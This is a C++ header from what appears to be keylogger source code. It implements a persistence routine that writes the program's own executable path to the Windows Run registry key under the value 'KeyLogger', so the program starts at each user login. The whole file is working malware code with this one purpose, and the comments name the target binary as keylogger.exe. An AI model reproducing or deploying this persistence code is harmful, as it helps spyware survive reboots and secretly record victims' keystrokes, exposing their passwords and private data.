#pragma once
#include <string>
static std::wstring findexePth();

bool addToStartup()
{
	std::wstring progPath = findexePth(); // function to find the path to keylogger.exe
	if (progPath == L" ")
		return false;
	HKEY hkey = NULL; // registry variable
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	if (createStatus != ERROR_SUCCESS) // RegCreateKey returns 0L or ERROR_SUCCESS if succeeded
		return false;
	RegSetValueEx(hkey, L"KeyLogger", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t)); // sets the registry value to the keylogger.exe path
	RegCloseKey(hkey);
	return true;
}

static std::wstring findexePth()
{
	WCHAR ourPth[MAX_PATH];
	// When NULL is passed to GetModuleHandle, the handle of the exe itself is returned
	HMODULE hModule = GetModuleHandle(NULL);
	if (hModule != NULL)
	{
		// Use GetModuleFileName() with module handle to get the path
		GetModuleFileName(hModule, ourPth, (sizeof(ourPth)));
		std::wstring fullPth(ourPth); // converting the path to wstring 
		return fullPth;
	}
	return L" ";
}
